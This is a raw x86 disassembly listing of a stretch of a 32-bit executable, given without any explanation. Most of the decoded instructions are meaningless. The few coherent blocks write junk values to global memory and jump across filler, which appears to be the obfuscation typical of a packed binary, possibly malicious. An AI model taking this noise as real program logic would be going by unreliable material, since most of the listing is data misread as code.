  40a62a:	arpl   cx,bp
  40a62c:	mov    ecx,0x1fff61e9
  40a631:	xchg   DWORD PTR [edx+0x64],ebx
  40a634:	lock les esi,FWORD PTR [eax-0x15c52592]
  40a63b:	outs   dx,DWORD PTR ds:[esi]
  40a63c:	sub    bh,dl
  40a63e:	mov    eax,0x6de69558
  40a643:	aam    0xab
  40a645:	or     esp,ecx
  40a647:	dec    edx
  40a648:	add    al,0x56
  40a64a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a64b:	push   ebx
  40a64c:	mov    BYTE PTR [ebx+0x3cdd8cb1],0x88
  40a653:	inc    esi
  40a654:	add    edx,DWORD PTR [edx+0xd]
  40a657:	mov    edi,DWORD PTR [edi+0x78dd1034]
  40a65d:	adc    esp,DWORD PTR [edi-0x38]
  40a660:	mov    ds:0xf9a270ce,eax
  40a665:	rcr    ebx,cl
  40a667:	ins    DWORD PTR es:[edi],dx
  40a668:	inc    edx
  40a669:	test   al,0x20
  40a66b:	stos   DWORD PTR es:[edi],eax
  40a66c:	aaa    
  40a66d:	clc    
  40a66e:	xlat   BYTE PTR ds:[ebx]
  40a66f:	scas   al,BYTE PTR es:[edi]
  40a670:	mov    esp,0x28d8d51a
  40a675:	outs   dx,BYTE PTR ds:[esi]
  40a676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a677:	stos   BYTE PTR es:[edi],al
  40a678:	or     esi,DWORD PTR [ebp-0x18]
  40a67b:	loope  0x40a6c4
  40a67d:	fisttp DWORD PTR [edx]
  40a67f:	cs push edx
  40a681:	(bad)  
  40a682:	push   ebx
  40a683:	mov    ds:0x4717641a,eax
  40a688:	idiv   dh
  40a68a:	mov    al,ds:0x72c27eed
  40a68f:	jnp    0x40a706
  40a691:	cmp    esp,0x13
  40a694:	loop   0x40a6a9
  40a696:	and    BYTE PTR ss:[ebp-0x475327d6],0x17
  40a69e:	(bad)  
  40a69f:	in     eax,dx
  40a6a0:	cli    
  40a6a1:	ja     0x40a676
  40a6a3:	loopne 0x40a6f4
  40a6a5:	sahf   
  40a6a6:	xchg   ebx,eax
  40a6a7:	pushf  
  40a6a8:	or     al,0x7c
  40a6aa:	lds    esi,FWORD PTR ss:0x8292ae20
  40a6b1:	add    al,ah
  40a6b3:	adc    BYTE PTR ss:[ebx+0x20c34b3],ch
  40a6ba:	icebp  
  40a6bb:	xor    esp,DWORD PTR [ecx+eiz*4-0x6889fb23]
  40a6c2:	sub    al,0xb1
  40a6c4:	cwde   
  40a6c5:	inc    eax
  40a6c6:	jmp    0xbee8:0x73584750
  40a6cd:	dec    edx
  40a6ce:	inc    esi
  40a6cf:	push   esi
  40a6d0:	mov    ds:0x62b78ab0,eax
  40a6d5:	mov    esi,0x1a01efb7
  40a6da:	adc    eax,0x78363bb5
  40a6df:	jae    0x40a67a
  40a6e1:	into   
  40a6e2:	addr16 in al,0xf7
  40a6e5:	stos   BYTE PTR es:[edi],al
  40a6e6:	and    esi,DWORD PTR [esi]
  40a6e8:	sahf   
  40a6e9:	jmp    0x3be797ef
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x4337eb,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x4337d7,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x433867,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433897
  40a72f:	or     DWORD PTR ds:0x4338a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433893,0x433787
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43382f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4337e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43386f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43377f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43385b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43378b
  40a793:	sub    DWORD PTR ds:0x4337a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x8721ec0c
  40a7ac:	inc    ebp
  40a7ad:	dec    edx
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	hlt    
  40a7b7:	push   edx
  40a7b8:	dec    eax
  40a7b9:	pusha  
  40a7ba:	or     DWORD PTR [esi+0x67],ecx
  40a7bd:	(bad)  
  40a7be:	ret    0x4d96
  40a7c1:	daa    
  40a7c2:	mov    ds:0x3fd02c4a,al
  40a7c7:	or     al,BYTE PTR [ecx+0x26bb109d]
  40a7cd:	daa    
  40a7ce:	xor    al,BYTE PTR [ebx]
  40a7d0:	dec    eax
  40a7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7d2:	push   ebp
  40a7d3:	cmp    al,0xda
  40a7d5:	sti    
  40a7d6:	pop    ds
  40a7d7:	in     al,0x18
  40a7d9:	cmp    edi,ecx
  40a7db:	inc    esi
  40a7dc:	mov    cs:0xa4e210fa,eax
  40a7e2:	les    esi,FWORD PTR [edi-0x37]
  40a7e5:	jmp    0xe139:0x3bba154c
  40a7ec:	sbb    esi,DWORD PTR [ecx]
  40a7ee:	adc    eax,0x86b9846d
  40a7f3:	and    al,0x2c
  40a7f5:	out    0x3,eax
  40a7f7:	or     eax,0x556b1dd
  40a7fc:	xor    ebp,DWORD PTR [ecx-0x3cfa01c0]
  40a802:	out    dx,eax
  40a803:	pop    edi
  40a804:	jge    0x40a860
  40a806:	mov    esp,0x32a0390e
  40a80b:	mov    ebp,0x964aa7ea
  40a810:	cs dec ebp
  40a812:	rol    BYTE PTR [ebp-0x2ab14cbd],1
  40a818:	fs pusha 
  40a81a:	mul    DWORD PTR [esi-0x1d023e3a]
  40a820:	jmp    0x4b5a:0x25cdc2e9
  40a827:	mov    edi,DWORD PTR [ebx]
  40a829:	dec    ebx
  40a82a:	in     eax,dx
  40a82b:	xlat   BYTE PTR ds:[ebx]
  40a82c:	push   ebx
  40a82d:	iret   
  40a82e:	cmp    BYTE PTR [esi],dh
  40a830:	sbb    al,0xae
  40a832:	pop    edx
  40a833:	sub    DWORD PTR [edx],edx
  40a835:	add    DWORD PTR gs:[edx],esp
  40a838:	sub    cl,dl
  40a83a:	dec    esp
  40a83b:	outs   dx,BYTE PTR ds:[esi]
  40a83c:	and    edi,DWORD PTR [edx]
  40a83e:	fisubr DWORD PTR [ebp-0x7d]
  40a841:	daa    
  40a842:	pop    cx
  40a844:	das    
  40a845:	cmp    al,0x81
  40a847:	inc    ecx
  40a848:	fdiv   DWORD PTR [edx]
  40a84a:	int3   
  40a84b:	or     ah,BYTE PTR [edx+0x6e20fe93]
  40a851:	into   
  40a852:	or     ah,BYTE PTR [edi-0x4420bc0a]
  40a858:	inc    ebx
  40a859:	retf   
  40a85a:	add    bh,BYTE PTR [edx-0x6]
  40a85d:	jmp    0xe0bc:0x68335001
  40a864:	(bad)  [ebx-0x72102095]
  40a86a:	jmp    0x40a818
  40a86c:	fsub   st,st(3)
  40a86e:	das    
  40a86f:	jg     0x40a852
  40a871:	dec    esp
  40a872:	sub    esi,ebx
  40a874:	adc    BYTE PTR [ebp+0x65],0x93
  40a878:	popf   
  40a879:	scas   eax,DWORD PTR es:[edi]
  40a87a:	rol    DWORD PTR ds:0x7f11fc07,1
  40a880:	nop
  40a881:	imul   edi,edi,0xffffff8a
  40a884:	sub    cl,al
  40a886:	popa   
  40a887:	ror    BYTE PTR [eax+0x23a134a7],1
  40a88d:	push   esi
  40a88e:	stos   DWORD PTR es:[edi],eax
  40a88f:	sbb    DWORD PTR [ebx-0x37ee1f74],eax
  40a895:	repz das 
  40a897:	jbe    0x40a88d
  40a899:	mov    dh,0x74
  40a89b:	fsubr  DWORD PTR [eax+0x5cc042d1]
  40a8a1:	lods   al,BYTE PTR ds:[esi]
  40a8a2:	or     eax,0x179f900e
  40a8a7:	adc    DWORD PTR [edi-0x61251a95],eax
  40a8ad:	call   0x34a1:0x43418080
  40a8b4:	add    eax,0xf2742309
  40a8b9:	jge    0x40a8cd
  40a8bb:	jnp    0x40a8d6
  40a8bd:	xchg   edx,eax
  40a8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8bf:	and    al,BYTE PTR [ebp-0x36]
  40a8c2:	sbb    BYTE PTR [edx],dh
  40a8c4:	xor    DWORD PTR [edx],edi
  40a8c6:	mov    cl,dh
  40a8c8:	les    ebx,FWORD PTR [ebx]
  40a8ca:	mov    al,0xf0
  40a8cc:	add    DWORD PTR [edi-0x1343c252],esi
  40a8d2:	stc    
  40a8d3:	jmp    0x40a8d2
  40a8d5:	lds    ebx,FWORD PTR [ebp-0x489e0e40]
  40a8db:	inc    di
  40a8dd:	arpl   WORD PTR [edx+0x2],ax
  40a8e0:	int3   
  40a8e1:	dec    ecx
  40a8e2:	(bad)  
  40a8e3:	bound  ecx,QWORD PTR [ebx-0x25cc4d5a]
  40a8e9:	scas   eax,DWORD PTR es:[edi]
  40a8ea:	lock inc ebp
  40a8ec:	mov    bh,0x83
  40a8ee:	js     0x40a881
  40a8f0:	jo     0x40a922
  40a8f2:	jo     0x40a916
  40a8f4:	push   0xfffffffb
  40a8f6:	sub    cl,BYTE PTR [edi+0x39e2afea]
  40a8fc:	cs pop edx
  40a8fe:	jns    0x40a88b
  40a900:	xchg   DWORD PTR [edi+0x44],esp
  40a903:	inc    ebx
  40a904:	pop    edi
  40a905:	jl     0x40a93d
  40a907:	sub    BYTE PTR [ecx+edx*4+0x7b901e7],ah
  40a90e:	aaa    
  40a90f:	out    dx,eax
  40a910:	std    
  40a911:	das    
  40a912:	in     eax,0xe2
  40a914:	icebp  
  40a915:	or     al,0xa3
  40a917:	pusha  
  40a918:	add    al,0x62
  40a91a:	mov    ebp,0x97f4606
  40a91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a920:	jns    0x40a8c3
  40a922:	sbb    BYTE PTR [edi+0x61f9ed41],cl
  40a928:	pop    eax
  40a929:	in     eax,dx
  40a92a:	push   cs
  40a92b:	sti    
  40a92c:	in     al,0x1e
  40a92e:	xor    BYTE PTR [edx+0x33],dl
  40a931:	(bad)  
  40a932:	out    dx,al
  40a933:	inc    ebp
  40a934:	cmp    cl,bh
  40a936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a937:	bound  ecx,QWORD PTR [edx+ebp*8-0x27]
  40a93b:	cli    
  40a93c:	dec    edx
  40a93d:	pusha  
  40a93e:	dec    eax
  40a93f:	xor    eax,0x9de093eb
  40a944:	mov    ah,0x15
  40a946:	push   bx
  40a948:	sti    
  40a949:	(bad)  
  40a94a:	inc    esp
  40a94b:	retf   
  40a94c:	sbb    DWORD PTR [eax-0x63],esi
  40a94f:	sbb    cl,BYTE PTR [edi]
  40a951:	mov    cs,WORD PTR [ebp-0x74381e5d]
  40a957:	mov    bl,BYTE PTR [esi-0x18ff7a99]
  40a95d:	ins    DWORD PTR es:[edi],dx
  40a95e:	xchg   edx,eax
  40a95f:	fistp  WORD PTR [eax-0x75]
  40a962:	add    eax,DWORD PTR [ebp-0x22744d7b]
  40a968:	out    0x19,eax
  40a96a:	pop    esi
  40a96b:	xchg   BYTE PTR [ebx+eax*4+0x234bb76e],dh
  40a972:	icebp  
  40a973:	ins    DWORD PTR es:[edi],dx
  40a974:	inc    DWORD PTR [esi+0x432c7a24]
  40a97a:	mov    ds:0x4900db9d,al
  40a97f:	and    bh,BYTE PTR [eax]
  40a981:	push   esp
  40a982:	inc    edx
  40a983:	dec    eax
  40a984:	sub    edx,ebp
  40a986:	jp     0x40a9f0
  40a988:	inc    ebp
  40a989:	push   eax
  40a98a:	sbb    BYTE PTR [ecx+0x1a8d35ed],0x2d
  40a991:	or     bh,BYTE PTR [eax]
  40a993:	add    DWORD PTR [ebp+0x3a],ecx
  40a996:	pop    ecx
  40a997:	sbb    eax,0x84b6e751
  40a99c:	jg     0x40a9dc
  40a99e:	pop    ds
  40a99f:	push   esi
  40a9a0:	test   eax,0xe50f5954
  40a9a5:	neg    eax
  40a9a7:	fcmovb st,st(4)
  40a9a9:	sub    eax,0x717654d8
  40a9ae:	cmp    ebp,DWORD PTR [esi+0x8f98c1c]
  40a9b4:	test   al,0xed
  40a9b6:	pop    edi
  40a9b7:	stc    
  40a9b8:	arpl   WORD PTR [edx+0x19067bda],si
  40a9be:	pop    esi
  40a9bf:	ins    DWORD PTR es:[edi],dx
  40a9c0:	add    al,0x71
  40a9c2:	push   cs
  40a9c3:	jmp    FWORD PTR [edi-0x58]
  40a9c6:	mov    al,ds:0x737a4fdb
  40a9cb:	bound  ecx,QWORD PTR [eax]
  40a9cd:	in     al,dx
  40a9ce:	mov    DWORD PTR ds:0xbe796736,ebx
  40a9d4:	mov    dh,0xb3
  40a9d6:	sub    ecx,DWORD PTR [edx*4-0x33131da7]
  40a9dd:	rcr    BYTE PTR [ecx+0x21],1
  40a9e0:	(bad)  [ebx+0x19c53c9b]
  40a9e6:	jae    0x40a9cf
  40a9e8:	aam    0x5c
  40a9ea:	repnz mov ebp,0x2f9b72b3
  40a9f0:	stos   DWORD PTR es:[edi],eax
  40a9f1:	push   0xa5be8d62
  40a9f6:	mov    WORD PTR [eax-0x10f82915],gs
  40a9fc:	mov    DWORD PTR [ebp-0x14],eax
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433797,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433897,0x433867
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4337e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	sbb    ah,BYTE PTR [ebp+0xa]
  40aa37:	xchg   esp,eax
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	mov    ebx,0x9d3ca247
  40aa45:	push   edi
  40aa46:	sbb    al,BYTE PTR [eax]
  40aa48:	jp     0x40aa33
  40aa4a:	fwait
  40aa4b:	pop    edx
  40aa4c:	xor    eax,0x6b5a76e5
  40aa51:	call   0x92521e
  40aa56:	and    al,0x1b
  40aa58:	jno    0x40aad7
  40aa5a:	daa    
  40aa5b:	enter  0x56d5,0x14
  40aa5f:	aas    
  40aa60:	cmc    
  40aa61:	pop    edx
  40aa62:	aaa    
  40aa63:	jg     0x40aa29
  40aa65:	push   edx
  40aa66:	pop    esi
  40aa67:	pop    es
  40aa68:	add    ecx,DWORD PTR [ebx]
  40aa6a:	dec    edi
  40aa6b:	jp     0x40aa8a
  40aa6d:	dec    ebx
  40aa6e:	add    eax,esp
  40aa70:	xor    al,0xe
  40aa72:	inc    esp
  40aa73:	int3   
  40aa74:	push   cs
  40aa75:	mov    ah,BYTE PTR [edi]
  40aa77:	mov    ebp,ecx
  40aa79:	or     al,0xcc
  40aa7b:	loopne 0x40aa3f
  40aa7d:	psraw  mm0,QWORD PTR [edi+0x23]
  40aa81:	or     esi,esi
  40aa83:	xchg   esp,eax
  40aa84:	gs adc ax,0x22de
  40aa89:	test   DWORD PTR ds:0xa7bce54d,ebx
  40aa8f:	dec    eax
  40aa90:	add    ebx,DWORD PTR [ecx]
  40aa92:	mov    eax,0x6093e24
  40aa97:	xchg   ebp,eax
  40aa98:	js     0x40aabe
  40aa9a:	jg     0x40aa4c
  40aa9c:	jl     0x40aaee
  40aa9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa9f:	mov    ch,0x1e
  40aaa1:	add    eax,0xc167b813
  40aaa6:	inc    esi
  40aaa7:	or     esi,DWORD PTR [edi]
  40aaa9:	and    esp,esi
  40aaab:	add    al,0x4
  40aaad:	scas   al,BYTE PTR es:[edi]
  40aaae:	inc    edx
  40aaaf:	and    BYTE PTR [edi],cl
  40aab1:	mov    cl,bl
  40aab3:	call   0x2f01:0x2c4bd0e6
  40aaba:	(bad)  
  40aabb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aabc:	aaa    
  40aabd:	jge    0x40aa65
  40aabf:	into   
  40aac0:	dec    eax
  40aac1:	and    ah,dl
  40aac3:	into   
  40aac4:	xchg   edx,eax
  40aac5:	and    ah,ah
  40aac7:	pushf  
  40aac8:	or     ebx,DWORD PTR [esi]
  40aaca:	cmc    
  40aacb:	sbb    eax,0x635f1b76
  40aad0:	push   es
  40aad1:	in     al,0xba
  40aad3:	xor    DWORD PTR [edi],edx
  40aad5:	sub    BYTE PTR [edx-0x7a],0x6e
  40aad9:	sub    edi,esp
  40aadb:	repz sahf 
  40aadd:	mov    dl,0x52
  40aadf:	data16 (bad) 
  40aae1:	jb     0x40ab24
  40aae3:	jp     0x40ab5e
  40aae5:	cmp    BYTE PTR [eax+0x28],dh
  40aae8:	xchg   ecx,eax
  40aae9:	daa    
  40aaea:	add    ah,dl
  40aaec:	pop    edi
  40aaed:	and    eax,0x27fc5611
  40aaf2:	shl    DWORD PTR [ebp-0x1408950],cl
  40aaf8:	(bad)  
  40aaf9:	pop    edx
  40aafa:	dec    esi
  40aafb:	mov    eax,ds:0x8415b2a0
  40ab00:	mov    esi,0xcb131045
  40ab05:	push   ss
  40ab06:	cmp    eax,0x81f755fb
  40ab0b:	pop    ss
  40ab0c:	out    dx,al
  40ab0d:	lea    ebx,[ecx-0x7c]
  40ab10:	fldpi  
  40ab12:	popa   
  40ab13:	out    0x96,al
  40ab15:	sub    DWORD PTR [ecx+esi*4+0x3c],eax
  40ab19:	pop    es
  40ab1a:	mov    cl,0xbf
  40ab1c:	mov    esi,DWORD PTR [ebx+0x73e9c9cb]
  40ab22:	lock leave 
  40ab24:	adc    ch,BYTE PTR [edx-0x7e8f3685]
  40ab2a:	push   esi
  40ab2b:	bound  ecx,QWORD PTR [ebp+0x41c9c0f8]
  40ab31:	loope  0x40ab2d
  40ab33:	jmp    0x40ab32
  40ab35:	sub    BYTE PTR [eax+0x752e3fae],cl
  40ab3b:	loop   0x40ab23
  40ab3d:	and    ebp,DWORD PTR [edx-0x3]
  40ab40:	shl    DWORD PTR [ebp-0x3e],1
  40ab43:	mov    bh,0xc7
  40ab45:	sbb    ah,bl
  40ab47:	loope  0x40ab5b
  40ab49:	adc    ebp,DWORD PTR [eax+0x75ae7396]
  40ab4f:	ficomp DWORD PTR [esi+0x19dcfb2]
  40ab55:	jbe    0x40ab02
  40ab57:	imul   ebp,ebx,0x84f5ce2
  40ab5d:	int    0x9a
  40ab5f:	(bad)  
  40ab60:	test   eax,0x80f722f7
  40ab65:	jne    0x40ab82
  40ab67:	inc    ebx
  40ab68:	pop    edx
  40ab69:	jg     0x40ab53
  40ab6b:	and    dl,ch
  40ab6d:	(bad)  
  40ab6f:	mov    ds:0x9c981dd,al
  40ab74:	mov    al,ds:0x9cbb7b8f
  40ab79:	pushf  
  40ab7a:	xchg   esp,eax
  40ab7b:	sub    al,0xdb
  40ab7d:	inc    edx
  40ab7e:	pop    eax
  40ab7f:	mov    ah,0xb2
  40ab81:	(bad)  
  40ab82:	repnz xlat BYTE PTR ds:[ebx]
  40ab84:	pop    edi
  40ab85:	sbb    al,BYTE PTR [ebx-0x2dbd8557]
  40ab8b:	(bad)  
  40ab8c:	xor    DWORD PTR [edx],esp
  40ab8e:	add    BYTE PTR [ebx-0x8],0x47
  40ab92:	fdiv   QWORD PTR [edx+0xd]
  40ab95:	push   edx
  40ab96:	addr16 push ecx
  40ab98:	das    
  40ab99:	test   DWORD PTR es:[edx+0x2875a11f],0xd7602d32
  40aba4:	xor    BYTE PTR [esi+0x30],ah
  40aba7:	pop    edx
  40aba8:	je     0x40abb9
  40abaa:	mov    bh,0x5e
  40abac:	adc    al,BYTE PTR [edx]
  40abae:	pop    ss
  40abaf:	xor    esp,DWORD PTR [edx-0x23]
  40abb2:	mov    cl,0x2e
  40abb4:	int    0xb3
  40abb6:	ja     0x40abb8
  40abb8:	in     eax,dx
  40abb9:	ret    
  40abba:	mov    ds:0x8a6fb7d4,eax
  40abbf:	cmp    dl,BYTE PTR ds:0x7f2f5852
  40abc5:	ror    DWORD PTR [edi],cl
  40abc7:	sub    eax,0x62b37e39
  40abcc:	jecxz  0x40ab77
  40abce:	leave  
  40abcf:	outs   dx,BYTE PTR ds:[esi]
  40abd0:	retf   0xb736
  40abd3:	jne    0x40ab8a
  40abd5:	cmc    
  40abd6:	idiv   DWORD PTR [ebx-0x2af6c80d]
  40abdc:	rcr    DWORD PTR [ecx-0x6fd1e10f],1
  40abe2:	push   eax
  40abe3:	cmp    al,al
  40abe5:	push   esp
  40abe6:	out    0x37,al
  40abe8:	inc    ebp
  40abe9:	popa   
  40abea:	jae    0x40ac6b
  40abec:	sub    eax,ecx
  40abee:	inc    edx
  40abef:	fnstcw WORD PTR [eax+0x2af606f]
  40abf5:	les    ecx,FWORD PTR [edx-0x56]
  40abf8:	or     DWORD PTR [ebp-0x6],edi
  40abfb:	sbb    edx,DWORD PTR [eax+eax*8]
  40abfe:	mov    eax,ds:0xffcdff
  40ac03:	sub    esp,DWORD PTR [ebp-0x7f40bc64]
  40ac09:	aaa    
  40ac0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac0b:	es inc ebx
  40ac0d:	jo     0x40ac20
  40ac0f:	and    ecx,DWORD PTR [eax+ebp*2]
  40ac12:	mov    ds:0x6a955224,eax
  40ac17:	lods   al,BYTE PTR ds:[esi]
  40ac18:	fnstcw WORD PTR [ebx]
  40ac1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac1b:	ret    0x1f3e
  40ac1e:	mov    DWORD PTR [ebx-0x2d],esp
  40ac21:	fst    QWORD PTR [edi*8+0x46f42944]
  40ac28:	ins    BYTE PTR es:[edi],dx
  40ac29:	cld    
  40ac2a:	xchg   esi,eax
  40ac2b:	test   edi,esp
  40ac2d:	dec    ebp
  40ac2e:	cmc    
  40ac2f:	outs   dx,BYTE PTR ds:[esi]
  40ac30:	mov    al,ds:0xe50dbc89
  40ac35:	(bad)  
  40ac36:	jp     0x40ac49
  40ac38:	sar    DWORD PTR [ecx],0x28
  40ac3b:	(bad)  
  40ac3c:	xchg   esi,eax
  40ac3d:	mov    cl,BYTE PTR [edx-0x80]
  40ac40:	mov    esi,0xac362306
  40ac45:	test   al,0x7b
  40ac47:	fmul   DWORD PTR [edx-0x6337bf9]
  40ac4d:	popa   
  40ac4e:	call   0x73ab:0x64dfa580
  40ac55:	sbb    al,0x1b
  40ac57:	jmp    0xe3f48f40
  40ac5c:	ss in  al,dx
  40ac5e:	lahf   
  40ac5f:	shl    DWORD PTR [esi-0x7de6201e],0xa2
  40ac66:	cmp    BYTE PTR [ecx+0x18f2569e],ch
  40ac6c:	push   edi
  40ac6d:	xor    eax,0x7f55813
  40ac72:	test   eax,0xb8b3d23b
  40ac77:	fild   DWORD PTR [edi+edx*1+0xc]
  40ac7b:	pop    eax
  40ac7c:	loopne 0x40ac26
  40ac7e:	ins    BYTE PTR es:[edi],dx
  40ac7f:	pop    edi
  40ac80:	cli    
  40ac81:	hlt    
  40ac82:	xchg   esi,eax
  40ac83:	xor    DWORD PTR [eax],ebp
  40ac85:	aaa    
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x4337eb,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x43386f,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43386f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43386f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43386f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433908
  40acc6:	push   0x43394c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43386f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43386f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43386f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43386f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43381f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x47d108d5],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ada2
  40ad2c:	ss scas eax,DWORD PTR es:[edi]
  40ad2e:	and    esp,eax
  40ad30:	sub    BYTE PTR [esi],cl
  40ad32:	test   DWORD PTR [ecx+0x70],esi
  40ad35:	push   ds
  40ad36:	nop
  40ad37:	jb     0x40ace3
  40ad39:	in     eax,dx
  40ad3a:	pop    ss
  40ad3b:	dec    esp
  40ad3c:	setae  BYTE PTR [esi-0x3d]
  40ad40:	fadd   DWORD PTR [esi+0x54613d82]
  40ad46:	aaa    
  40ad47:	mov    esp,0xa95bdd42
  40ad4c:	xchg   edx,eax
  40ad4d:	inc    esi
  40ad4e:	fld    QWORD PTR [edi]
  40ad50:	jmp    0x8cebd425
  40ad55:	clc    
  40ad56:	ror    edx,0x8f
  40ad59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad5a:	aaa    
  40ad5b:	add    al,0x86
  40ad5d:	adc    DWORD PTR [ecx],ecx
  40ad5f:	dec    ebx
  40ad60:	loope  0x40adbc
  40ad62:	adc    eax,0x855c2291
  40ad67:	andnps xmm2,XMMWORD PTR [eax+0x46b47bd8]
  40ad6e:	push   cs
  40ad6f:	dec    edi
  40ad70:	inc    eax
  40ad71:	jae    0x40ada8
  40ad73:	xchg   ebp,eax
  40ad74:	push   esi
  40ad75:	push   ecx
  40ad76:	nop
  40ad77:	sbb    ebp,DWORD PTR [ebx+eiz*2]
  40ad7a:	aas    
  40ad7b:	ret    0x1190
  40ad7e:	add    BYTE PTR [eax-0x5c],0x9d
  40ad82:	enter  0xd7b7,0xb6
  40ad86:	add    esi,DWORD PTR [ebx+0x60]
  40ad89:	je     0x40ad5e
  40ad8b:	gs xchg ebx,eax
  40ad8d:	jb     0x40ad1f
  40ad8f:	jge    0x40ad4e
  40ad91:	jl     0x40ada8
  40ad93:	shr    DWORD PTR [ecx+0xbab230c],1
  40ad99:	lods   eax,DWORD PTR ds:[esi]
  40ad9a:	mov    al,0x27
  40ad9c:	adc    dh,BYTE PTR [eax-0x1d44ff32]
  40ada2:	push   edi
  40ada3:	rcl    BYTE PTR [edx+0x64ac0f3e],cl
  40ada9:	fld    TBYTE PTR [ebx-0xa]
  40adac:	mov    dl,BYTE PTR [ebx]
  40adae:	ret    0xd0e
  40adb1:	mov    al,ds:0xf96ce575
  40adb6:	and    eax,0xd4a864cc
  40adbb:	mov    edi,eax
  40adbd:	fwait
  40adbe:	stc    
  40adbf:	pop    edx
  40adc0:	pop    ebx
  40adc2:	dec    edx
  40adc3:	sbb    eax,0x36e2f6f3
  40adc8:	jmp    FWORD PTR [esi]
  40adca:	xor    DWORD PTR [edx],ebx
  40adcc:	inc    esi
  40adcd:	mov    BYTE PTR [esi-0x7919d5f],cl
  40add3:	or     al,ah
  40add5:	mov    ?,WORD PTR [eax+0x4b]
  40add8:	mov    es:0x72dd3f48,eax
  40adde:	std    
  40addf:	sbb    dh,bl
  40ade1:	pusha  
  40ade2:	mov    dh,0x2a
  40ade4:	add    DWORD PTR [ecx+edx*1+0x39e73fd0],ebx
  40adeb:	js     0x40ad74
  40aded:	loopne 0x40adfc
  40adef:	jo     0x40ade9
  40adf1:	int    0x59
  40adf3:	retf   0x599a
  40adf6:	rol    BYTE PTR [ecx+0x6943915d],1
  40adfc:	les    eax,FWORD PTR [ebp+0x464f6571]
  40ae02:	pop    edi
  40ae03:	aaa    
  40ae04:	jo     0x40adc4
  40ae06:	jmp    DWORD PTR [ecx-0x57]
  40ae09:	pop    edx
  40ae0a:	jge    0x40ae84
  40ae0c:	sub    al,0xcb
  40ae0e:	pop    esi
  40ae0f:	pop    es
  40ae10:	in     eax,dx
  40ae11:	cli    
  40ae12:	mov    ds:0x39765e23,al
  40ae17:	clc    
  40ae18:	or     ah,BYTE PTR [esi-0xa]
  40ae1b:	mov    bl,BYTE PTR [ecx]
  40ae1d:	sub    ebp,DWORD PTR [ebx]
  40ae1f:	je     0x40ae84
  40ae21:	add    al,0x38
